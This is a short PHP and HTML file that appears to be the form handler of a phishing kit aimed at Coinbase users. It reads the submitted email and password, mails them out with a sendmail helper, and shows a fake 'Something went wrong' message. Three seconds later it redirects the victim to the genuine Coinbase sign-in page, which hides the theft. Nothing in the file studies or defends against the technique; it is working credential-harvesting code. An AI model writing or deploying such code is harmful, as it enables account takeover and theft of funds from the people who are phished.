<?php
include 'functions.php';

    $email = $pass = "";
 if($_SERVER['REQUEST_METHOD'] == "POST"){
  $email = validate_input($_POST['email']);
  $pass = validate_input($_POST['password']);
  sendmail($email, $pass); 
  if ($mail->send()){
    echo("
    <p>Oops! Something went wrong. You will be redirected to the sign in page in 3s</p>
    ");
  }
 }
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title></title>
</head>
<style>
p{
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
   padding: 5% 3%;
   border-radius: 5px;
   box-shadow: 0px 1px 20px rgb(156, 154, 154);
   font-size: 18px;
   font-weight: 300;
   font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
   }
</style>
<body>

  <script>
    setTimeout(() => {
      location.href= "https://www.coinbase.com/signin"
    }, 3000);
  </script>
</body>
</html>